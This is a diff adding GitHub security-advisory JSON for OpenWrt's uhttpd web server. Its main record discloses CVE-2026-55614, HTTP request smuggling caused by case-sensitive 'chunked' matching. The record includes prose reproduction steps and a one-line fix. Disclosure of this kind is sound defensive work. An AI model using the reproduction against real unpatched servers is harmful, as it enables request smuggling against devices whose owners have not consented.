+          "starred_url": "https://api.github.com/users/dyingc/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/dyingc/subscriptions",
+          "organizations_url": "https://api.github.com/users/dyingc/orgs",
+          "repos_url": "https://api.github.com/users/dyingc/repos",
+          "events_url": "https://api.github.com/users/dyingc/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/dyingc/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "analyst",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 4,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-mcfg-c4r7-pjpf",
+    "cve_id": "CVE-2026-55614",
+    "url": "https://api.github.com/repos/openwrt/uhttpd/security-advisories/GHSA-mcfg-c4r7-pjpf",
+    "html_url": "https://github.com/openwrt/uhttpd/security/advisories/GHSA-mcfg-c4r7-pjpf",
+    "summary": "HTTP request smuggling via case-sensitive Transfer-Encoding matching",
+    "description": "Location: client.c:405, function client_parse_headerIntroduced: commit 2bef561c (2013-01-03, \"add post data relaying\")Severity: High (CVSS 3.1 ~8.1)\r\n\r\nDescription:\r\n\r\nclient_parse_header() lowercases header names but compares theTransfer-Encoding value using case-sensitive strcmp(val, \"chunked\").RFC 9112 §6.1 (formerly RFC 7230 §3.3.1) requires transfer-coding tokensto be compared case-insensitively.\r\n\r\nWhen a client sends Transfer-Encoding: Chunked (mixed case), the headeris accepted but chunked body framing is not enabled (r->transfer_chunkedstays false). On a keep-alive connection, the unread body bytes are thenparsed as the next HTTP request.\r\n\r\nNotably, the same function already uses strcasecmp for the Connectionheader value (line 409) — the inconsistency appears to be an oversight.\r\n\r\nReproduction:\r\n\r\nSend a POST with Transfer-Encoding: Chunked (capital C) followed by achunked body and a pipelined GET, all on one keep-alive TCP connection.The server returns two responses: one for the POST (with empty body — thechunked data was not consumed) and one generated from the leftover bodybytes being reparsed as a new request.\r\n\r\nSuggested fix:\r\n```\r\n - if (!strcmp(val, \"chunked\"))\r\n + if (!strcasecmp(val, \"chunked\"))\r\n```\r\nOr reject requests with unsupported Transfer-Encoding values (501 perRFC 9112 §6.1).",
+    "severity": "high",
+    "author": null,
+    "publisher": {
+      "login": "hauke",
+      "id": 78494,
+      "node_id": "MDQ6VXNlcjc4NDk0",
+      "avatar_url": "https://avatars.githubusercontent.com/u/78494?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/hauke",
+      "html_url": "https://github.com/hauke",
+      "followers_url": "https://api.github.com/users/hauke/followers",
+      "following_url": "https://api.github.com/users/hauke/following{/other_user}",
+      "gists_url": "https://api.github.com/users/hauke/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/hauke/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/hauke/subscriptions",
+      "organizations_url": "https://api.github.com/users/hauke/orgs",
+      "repos_url": "https://api.github.com/users/hauke/repos",
+      "events_url": "https://api.github.com/users/hauke/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/hauke/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-mcfg-c4r7-pjpf",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-55614",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-11-11T23:40:45Z",
+    "published_at": "2026-06-29T23:02:13Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": ""
+        },
+        "vulnerable_version_range": "< 1b624f8f814ed568608d756512892416e0431d77",
+        "patched_versions": "https://github.com/openwrt/uhttpd/commit/ae015e099986ceace44975cb69629841a2d58d37",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": null
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "credits": [
+      {
+        "login": "dyingc",
+        "type": "analyst"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "dyingc",
+          "id": 28287426,
+          "node_id": "MDQ6VXNlcjI4Mjg3NDI2",
+          "avatar_url": "https://avatars.githubusercontent.com/u/28287426?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/dyingc",
+          "html_url": "https://github.com/dyingc",
+          "followers_url": "https://api.github.com/users/dyingc/followers",
+          "following_url": "https://api.github.com/users/dyingc/following{/other_user}",
+          "gists_url": "https://api.github.com/users/dyingc/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/dyingc/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/dyingc/subscriptions",
+          "organizations_url": "https://api.github.com/users/dyingc/orgs",
+          "repos_url": "https://api.github.com/users/dyingc/repos",
+          "events_url": "https://api.github.com/users/dyingc/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/dyingc/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "analyst",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 5,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  }
+]
